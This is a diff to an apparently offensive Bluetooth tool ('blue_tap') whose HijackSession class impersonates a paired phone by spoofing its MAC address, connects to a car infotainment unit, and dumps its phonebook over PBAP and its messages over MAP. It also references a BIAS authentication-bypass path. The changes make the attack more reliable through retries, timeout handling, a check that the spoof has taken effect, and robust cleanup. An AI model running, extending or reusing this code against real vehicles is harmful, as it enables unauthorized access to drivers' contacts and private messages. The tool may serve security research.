@@ -183,16 +183,24 @@ class HijackSession:
             ])
 
             import subprocess
-            result = subprocess.run(
-                ["bluetoothctl"],
-                input=bt_commands,
-                capture_output=True,
-                text=True,
-                timeout=30,
-                errors="replace",
-            )
+            try:
+                result = subprocess.run(
+                    ["bluetoothctl"],
+                    input=bt_commands,
+                    capture_output=True,
+                    text=True,
+                    timeout=30,
+                    errors="replace",
+                )
+            except subprocess.TimeoutExpired:
+                error("bluetoothctl timed out after 30s — pairing may be incomplete")
+                # Clean up partial pairing state
+                run_cmd(["bluetoothctl", "cancel-pairing", self.ivi_address], timeout=5)
+                return False
             output = result.stdout + result.stderr
             verbose(f"bluetoothctl output:\n{output.strip()}")
+            if result.returncode != 0:
+                warning(f"bluetoothctl exited with code {result.returncode}")
 
             # Give profiles time to negotiate
             time.sleep(3)
@@ -202,9 +210,32 @@ class HijackSession:
             if "Connected: yes" in verify.stdout:
                 success(f"Connected to IVI {self.ivi_address}")
                 return True
-            else:
-                warning("Connection not verified. Profiles may not be accessible.")
+
+            # Retry once — IVIs can be slow to accept connections
+            warning("Connection not verified, retrying in 3s...")
+            time.sleep(3)
+
+            try:
+                result = subprocess.run(
+                    ["bluetoothctl"],
+                    input=bt_commands,
+                    capture_output=True,
+                    text=True,
+                    timeout=30,
+                    errors="replace",
+                )
+            except subprocess.TimeoutExpired:
+                error("bluetoothctl retry timed out")
                 return False
+
+            time.sleep(3)
+            verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
+            if verify.returncode == 0 and "Connected: yes" in verify.stdout:
+                success("Connected on retry")
+                return True
+
+            error(f"Could not establish connection to {self.ivi_address} after retry")
+            return False
 
     def connect_bias(self) -> bool:
         """Phase 2+3 alternative: Use BIAS attack to bypass authentication.
@@ -239,12 +270,14 @@ class HijackSession:
                 return {}
 
             out = output_dir or f"{self.output_dir}/pbap"
+            verbose(f"Connecting to PBAP channel {self.pbap_channel}...")
             self.pbap_client = PBAPClient(self.ivi_address, channel=self.pbap_channel)
 
             if not self.pbap_client.connect():
                 error("PBAP connection failed")
                 return {}
 
+            verbose("PBAP connected, starting phonebook dump...")
             try:
                 results = self.pbap_client.pull_all_data(out)
                 success(f"PBAP dump complete: {len(results)} objects")
@@ -260,12 +293,14 @@ class HijackSession:
                 return {}
 
             out = output_dir or f"{self.output_dir}/map"
+            verbose(f"Connecting to MAP channel {self.map_channel}...")
             self.map_client = MAPClient(self.ivi_address, channel=self.map_channel)
 
             if not self.map_client.connect():
                 error("MAP connection failed")
                 return {}
 
+            verbose("MAP connected, starting message dump...")
             try:
                 results = self.map_client.dump_all_messages(out)
                 success("MAP dump complete")
@@ -315,10 +350,21 @@ class HijackSession:
                 results["phases"]["impersonate"] = {"status": "success"}
             else:
                 results["phases"]["impersonate"] = {"status": "failed"}
-                warning("Continuing despite impersonation issues...")
+                error("Impersonation failed — cannot connect to IVI without spoofed identity")
+                results["overall"] = "failed"
+                return results
         except Exception as e:
             error(f"Impersonation failed: {e}")
             results["phases"]["impersonate"] = {"status": "failed", "error": str(e)}
+            results["overall"] = "failed"
+            return results
+
+        # Phase gate: verify adapter is in spoofed state before connecting
+        from blue_tap.utils.bt_helpers import get_adapter_address
+        current_mac = get_adapter_address(self.hci)
+        if current_mac and current_mac.upper() != self.phone_address.upper():
+            warning(f"Adapter MAC {current_mac} does not match target phone {self.phone_address}")
+            warning("Impersonation may not have taken effect — connection will likely fail")
 
         # Phase 3: Connect
         connected = False
@@ -458,16 +504,39 @@ class HijackSession:
     def cleanup(self, restore_mac: bool = True):
         """Disconnect all active connections and restore adapter."""
         info("Cleaning up...")
-        if self.pbap_client:
-            self.pbap_client.disconnect()
-        if self.map_client:
-            self.map_client.disconnect()
-        if self.hfp_client:
-            self.hfp_client.disconnect()
 
+        # Disconnect PBAP
+        if self.pbap_client:
+            try:
+                self.pbap_client.disconnect()
+            except Exception as e:
+                warning(f"PBAP disconnect failed: {e}")
+
+        # Disconnect MAP
+        if self.map_client:
+            try:
+                self.map_client.disconnect()
+            except Exception as e:
+                warning(f"MAP disconnect failed: {e}")
+
+        # Disconnect HFP
+        if self.hfp_client:
+            try:
+                self.hfp_client.disconnect()
+            except Exception as e:
+                warning(f"HFP disconnect failed: {e}")
+
+        # Restore adapter
         if restore_mac:
-            from blue_tap.core.spoofer import restore_original_mac
-            restore_original_mac(self.hci)
+            try:
+                from blue_tap.core.spoofer import restore_original_mac
+                restore_original_mac(self.hci)
+            except Exception as e:
+                warning(f"MAC restore failed: {e}")
         else:
-            adapter_reset(self.hci)
+            try:
+                adapter_reset(self.hci)
+            except Exception as e:
+                warning(f"Adapter reset failed: {e}")
+
         success("Cleanup complete")
